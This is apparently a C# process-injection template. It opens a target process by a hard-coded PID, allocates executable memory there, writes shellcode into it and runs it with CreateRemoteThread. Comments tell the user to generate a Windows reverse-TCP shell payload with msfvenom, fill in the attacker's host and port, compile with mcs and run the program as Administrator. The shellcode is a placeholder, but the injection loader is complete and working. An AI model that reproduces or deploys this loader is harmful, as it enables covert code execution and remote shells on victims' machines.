using System;
using System.Runtime.InteropServices;
//This Project was built in C# so rename it to Sourcecode.cs before compiling or using

namespace Inject
{
    class Program
    {
        
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
            processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
            dwSize, uint flAllocationType, uint flProtect);


            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);
            static void Main(string[] args)
            {
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            //msfvenom -p windows/shell_reverse_tcp LHOST=<Local Host> LPORT=<LocalPortToListenOn> -f csharp
	    //Compile on your linux machine using mcs: mcs sourcecode.cs ,it will output: sourcecode.exe, run the Sourcecode.exe as Administrator
            byte[] buf = new byte[324] {YOUR-SHELL-CODE-GENERATED FROM MSFVENOM};

            IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
IntPtr.Zero, 0, IntPtr.Zero);


            }
        }
    }

